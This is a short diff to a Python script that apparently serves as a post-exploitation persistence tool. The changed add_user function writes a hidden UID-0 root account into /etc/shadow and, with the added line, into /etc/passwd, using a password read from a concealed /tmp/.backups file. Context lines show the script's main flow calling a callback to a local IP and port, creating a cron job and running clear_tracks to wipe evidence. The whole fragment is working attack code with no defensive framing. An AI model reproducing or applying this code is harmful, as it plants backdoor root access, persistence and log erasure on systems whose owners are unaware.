@@ -64,8 +64,9 @@ def add_user(username,password):
 		f = open("/tmp/.backups/passwd.txt", "r")
 		new_user_pass = f.read().strip()
 		os.system("echo '{}:{}:0:0:root:/{}:/bin/bash' >> /etc/shadow".format(username,new_user_pass,username))
-		print("user {} added".format(username))
 		f.close()
+		os.system("echo '{}:x:0:0:{}:/root:/bin/bash' >> /etc/passwd".format(username,username))
+		print("user {} added".format(username))
 	else:
 		print("\n*** error: username not specified: use -u to specify username ***")
 		return
@@ -130,4 +131,3 @@ if is_root or args.force:
 	callback(local_ip, local_port, username, password)
 	cron_make()
 	clear_tracks()
-	
